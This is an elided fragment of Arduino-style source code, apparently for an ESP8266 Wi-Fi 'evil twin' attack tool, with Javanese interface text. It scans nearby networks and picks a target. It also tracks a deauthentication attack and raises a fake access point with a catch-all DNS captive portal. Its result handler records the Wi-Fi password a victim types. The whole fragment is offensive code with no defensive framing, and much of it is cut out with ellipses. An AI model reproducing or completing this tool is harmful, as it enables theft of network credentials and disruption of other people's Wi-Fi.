...
void handleResult() {
  ...
  if (WiFi.status() != WL_CONNECTED) {
    ...
    WiFi.softAP("KipasanAngin", "manjingbae");
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    _correct = "Ekoloh password " + _selectedNetwork.ssid + " kuh: " + _tryPassword;
...
String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   ...
                   "</div></br><table><tr><th>Arane wifie</th><th>Alamat Mac.e</th><th>Jalur.e</th><th>Kang Endi</th></tr>";
void handleIndex() {
  ...
  if (hotspot_active == false) {
    ...
    for (int i = 0; i < 16; ++i) {
      ...
      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        _html += "<button style='background-color: #90ee90;'>Lagi Kien</button></form></td></tr>";
      } else {
        _html += "<button>Kang Endi,kien tah?</button></form></td></tr>";
      }
    }
    if (deauthing_active) {
